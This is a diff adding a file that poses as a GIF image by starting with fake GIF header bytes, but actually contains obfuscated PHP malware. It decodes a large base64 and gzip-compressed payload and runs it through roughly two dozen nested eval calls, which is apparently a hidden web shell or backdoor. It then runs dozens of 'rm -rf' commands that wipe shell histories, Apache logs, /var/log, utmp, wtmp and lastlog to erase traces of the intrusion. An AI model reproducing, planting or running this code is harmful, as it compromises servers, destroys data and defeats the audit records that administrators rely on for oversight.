@@ -1,0 +1,127 @@
+GIF8a
+GIF89a
+GIF9aroot
+<?php
+
+function _XEwW($_bRGtfU)
+{
+    $_bRGtfU = substr($_bRGtfU, (int) hex2bin("31303735"));
+    $_bRGtfU = substr($_bRGtfU, (int) hex2bin("30"), (int) hex2bin("2d363036"));
+    return $_bRGtfU;
+}
+
+$_nisFj = "base64_decode";
+function _xHEIiojDjOTAT($_lmi1WdhA)
+{
+    global $_8FHsXE6;
+    global $_nisFj;
+    return strrev(gzinflate($_nisFj(_XEwW($_lmi1WdhA))));
+}
+
+eval(
+    eval(
+        eval(
+            eval(
+                eval(
+                    eval(
+                        eval(
+                            eval(
+                                eval(
+                                    eval(
+                                        eval(
+                                            eval(
+                                                eval(
+                                                    eval(
+                                                        eval(
+                                                            eval(
+                                                                eval(
+                                                                    eval(
+                                                                        eval(
+                                                                            eval(
+                                                                                eval(
+                                                                                    eval(
+                                                                                        eval(
+                                                                                            eval(
+                                                                                                eval(
+                                                                                                    eval(
+                                                                                                        _xHEIiojDjOTAT(
+                                                                                                            "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"
+                                                                                                        )
+                                                                                                    )
+                                                                                                )
+                                                                                            )
+                                                                                        )
+                                                                                    )
+                                                                                )
+                                                                            )
+                                                                        )
+                                                                    )
+                                                                )
+                                                            )
+                                                        )
+                                                    )
+                                                )
+                                            )
+                                        )
+                                    )
+                                )
+                            )
+                        )
+                    )
+                )
+            )
+        )
+    )
+);
+	exec("rm -rf /root/.ksh_history");
+	exec("rm -rf /root/.bash_history");
+	exec("rm -rf /root/.bash_logout");
+	exec("rm -rf /usr/local/apache/logs");
+	exec("rm -rf /usr/local/apache/log");
+	exec("rm -rf /var/apache/logs");
+	exec("rm -rf /ar/apache/log");
+	exec("rm -rf /var/run/utmp");
+	exec("rm -rf /var/logs");
+	exec("rm -rf /var/log");
+	exec("rm -rf /var/adm");
+	exec("rm -rf /etc/wtmp");
+	exec("rm -rf /etc/utmp");
+	exec("rm -rf $HISTFILE");
+	exec("rm -rf /var/log/lastlog");
+	exec("rm -rf /var/log/wtmp");
+	shell_exec("rm -rf /tmp/logs");
+	shell_exec("rm -rf /root/.ksh_history");
+	shell_exec("rm -rf /root/.bash_history");
+	shell_exec("rm -rf /root/.bash_logout");
+	shell_exec("rm -rf /usr/local/apache/logs");
+	shell_exec("rm -rf /usr/local/apache/log");
+	shell_exec("rm -rf /var/apache/logs");
+	shell_exec("rm -rf /var/apache/log");
+	shell_exec("rm -rf /var/run/utmp");
+	shell_exec("rm -rf /var/logs");
+	shell_exec("rm -rf /var/log");
+	shell_exec("rm -rf /var/adm");
+	shell_exec("rm -rf /etc/wtmp");
+	shell_exec("rm -rf /etc/utmp");
+	shell_exec("rm -rf $HISTFILE");
+	shell_exec("rm -rf /var/log/lastlog");
+	shell_exec("rm -rf /var/log/wtmp");
+	passthru("rm -rf /tmp/logs");
+	passthru("rm -rf /root/.ksh_history");
+	passthru("rm -rf /root/.bash_history");
+	passthru("rm -rf /root/.bash_logout");
+	passthru("rm -rf /usr/local/apache/logs");
+	passthru("rm -rf /usr/local/apache/log");
+	passthru("rm -rf /var/apache/logs");
+	passthru("rm -rf /var/apache/log");
+	passthru("rm -rf /var/run/utmp");
+	passthru("rm -rf /var/logs");
+	passthru("rm -rf /var/log");
+	passthru("rm -rf /var/adm");
+	passthru("rm -rf /etc/wtmp");
+	passthru("rm -rf /etc/utmp");
+	passthru("rm -rf $HISTFILE");
+	passthru("rm -rf /var/log/lastlog");
+	passthru("rm -rf /var/log/wtmp");
+	system("rm -rf /tmp/logs");
+?>
